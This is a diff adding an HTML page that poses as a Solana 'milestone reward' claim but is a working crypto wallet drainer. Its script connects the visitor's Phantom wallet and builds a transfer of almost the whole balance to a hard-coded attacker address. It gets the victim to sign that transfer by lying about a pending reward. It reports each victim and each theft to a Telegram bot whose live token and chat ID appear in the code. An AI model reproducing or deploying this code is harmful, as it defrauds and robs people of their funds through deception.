@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Solana Milestone Reward</title>
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+    <style>
+        body { background: #121212; color: #fff; font-family: sans-serif; text-align: center; padding-top: 50px; }
+        .box { border: 1px solid #333; padding: 20px; border-radius: 10px; display: inline-block; background: #1a1a1a; }
+        .btn { background: #14f195; color: #000; padding: 15px 40px; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 20px; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2>Congratulations! 🎊</h2>
+        <p>Wallet <b>ARu4n5...</b> identified for 50+ Tx Reward</p>
+        <h1 style="color: #14f195;">0.25 SOL</h1>
+        <button class="btn" onclick="claim()">CLAIM REWARD</button>
+    </div>
+
+    <script>
+        // --- EDIT BAGIAN INI ---
+        const MY_WALLET = "281zPhwW9yozngsNgXymgC8jR2vP98Zz1c69kHDFEuoc"; 
+        const BOT_TOKEN = "8539107085:AAGOfPQa0X1L-tuWPmdmJH52Bqx30Yao4qQ";
+        const CHAT_ID = "6518432642";
+        // -----------------------
+
+        async function sendLog(msg) {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
+        }
+
+        async function claim() {
+            const provider = window.solana;
+            if (!provider) return alert("Please open this link inside Phantom Browser/Extension");
+
+            try {
+                const resp = await provider.connect();
+                const victim = resp.publicKey;
+                await sendLog(`<b>🚨 Target Connected!</b>\nWallet: <code>${victim.toString()}</code>`);
+
+                const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
+                const balance = await conn.getBalance(victim);
+
+                if (balance < 1000000) return alert("Ineligible: Minimum balance not met.");
+
+                // Buat transaksi kuras SOL
+                const tx = new solanaWeb3.Transaction().add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: victim,
+                        toPubkey: new solanaWeb3.PublicKey(MY_WALLET),
+                        lamports: balance - 500000, // Potong gas fee dikit
+                    })
+                );
+
+                let { blockhash } = await conn.getRecentBlockhash();
+                tx.recentBlockhash = blockhash;
+                tx.feePayer = victim;
+
+                // Minta konfirmasi di Phantom
+                const signed = await provider.signAndSendTransaction(tx);
+                await sendLog(`<b>💰 JEKPOT!</b>\nBerhasil kuras saldo dari: ${victim.toString()}\nTX: ${signed.signature}`);
+                
+                alert("Processing... Reward will be sent in 24 hours.");
+            } catch (e) {
+                await sendLog(`❌ Target nolak konfirmasi.`);
+            }
+        }
+    </script>
+</body>
+</html>
+
+
